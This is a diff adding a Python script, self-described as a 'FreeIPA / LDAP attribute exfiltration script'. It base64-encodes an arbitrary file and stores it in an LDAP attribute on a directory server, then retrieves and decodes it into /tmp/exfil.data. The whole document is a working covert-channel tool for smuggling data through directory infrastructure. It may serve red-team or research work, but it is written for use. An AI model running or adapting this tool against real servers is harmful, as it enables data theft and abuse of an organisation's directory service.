@@ -1,0 +1,87 @@
+#!/usr/bin/env python
+
+import sys, os
+import argparse
+import ldap
+import ldap.modlist
+import base64
+import getpass
+
+def main():
+    parser = argparse.ArgumentParser(description='FreeIPA / LDAP attribute exfiltration script')
+    parser.add_argument('-f', '--file', type=str, help='File name to upload', required=False)
+    parser.add_argument('-s', '--server', type=str, help='FreeIPA LDAP server', required=True, default=None)
+    parser.add_argument('-d', '--dname', type=str, help='LDAP distinguished name', required=True, default=None)
+    parser.add_argument('-a', '--attribute', type=str, help='LDAP attribute name', required=True, default=None)
+    parser.add_argument('-m', '--mode', type=str, help='Mode name', required=True, default=None)
+    parser.add_argument('-o', '--output', type=str, help='Output file name', required=False, default="/tmp/exfil.data")
+    parser.add_argument('-p', '--password', type=str, help='Password', required=False, default=None)
+    args = parser.parse_args()
+    file = args.file
+    server = args.server
+    dname = args.dname
+    password = args.password
+    attribute = args.attribute
+    mode = args.mode
+    output = args.output
+
+    if args.mode == "get":
+    	ldap_connect_get(args.server, args.dname, args.password, args.attribute, args.output)
+    elif args.mode == "set":
+        ldap_connect_set(args.server, args.dname, args.password, args.attribute, args.file)
+    else:
+        sys.exit()
+
+def ldap_connect_get(server, dname, password, attribute, output):
+   l = ldap.initialize(server)
+   l.protocol_version = ldap.VERSION3
+   searchScope = ldap.SCOPE_SUBTREE
+   retrieveAttributes = None
+   searchFilter = "objectClass=*"
+   try:
+       entries = 0
+       ldap_result_id = l.search(dname, searchScope, searchFilter, retrieveAttributes)
+       result_set = []
+       while 1:
+               result_type, result_data = l.result(ldap_result_id, 0)
+               if (result_data == []):
+                  break
+               else:
+                  if result_type == ldap.RES_SEARCH_ENTRY:
+                     result_set.append(result_data)
+                     entries = entries + 1
+   except ldap.LDAPError, e:
+        print e
+
+   for i in range(len(result_set)):
+           for entry in result_set[i]:
+              attr = entry[1][attribute][0]
+              decoded = base64.decodestring(attr)
+              print decoded + "\n"
+              file = open(output, "w")
+              file.write(decoded)
+              file.close()
+              print("*** File saved to ") + output
+
+def ldap_connect_set(server, dname, password, attribute, file):
+       ex_file = open(file, "rb")
+       ex_file_read = ex_file.read()
+       ex_file_encode = base64.encodestring(ex_file_read).replace('\n', '')
+       l = ldap.initialize(server)
+       l.simple_bind_s(dname,password)
+       ldif = [( ldap.MOD_REPLACE, attribute, ex_file_encode)]
+       print("*** Encoded Data : [ %s ]\n") % ex_file_encode
+       print("*** Size: [ %s ] bytes") % len(ex_file_encode)
+       try:
+          l.modify_s(dname,ldif)
+       except Exception as error:
+          print('*** ERROR', error)
+       else:
+          print('*** Status: OK')
+       l.unbind_s()
+   
+if __name__ == "__main__":
+
+    main()
+
+   
